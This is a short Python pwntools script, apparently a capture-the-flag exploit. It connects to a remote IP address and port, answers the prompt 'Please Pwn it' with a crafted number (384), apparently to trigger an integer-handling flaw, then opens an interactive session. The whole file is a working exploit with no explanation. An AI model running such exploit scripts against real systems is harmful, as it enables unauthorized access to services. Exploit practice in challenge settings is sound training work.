from pwn import * 
from pwn import p64
import socket
context(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']


ip = "121.4.111.50"
r = remote(ip,31939)#远程连接
i = 255 * 2 + -126
i = str(i)
# r = process("./pwn")
r.sendlineafter(b"Please Pwn it\n",i)
r.interactive()

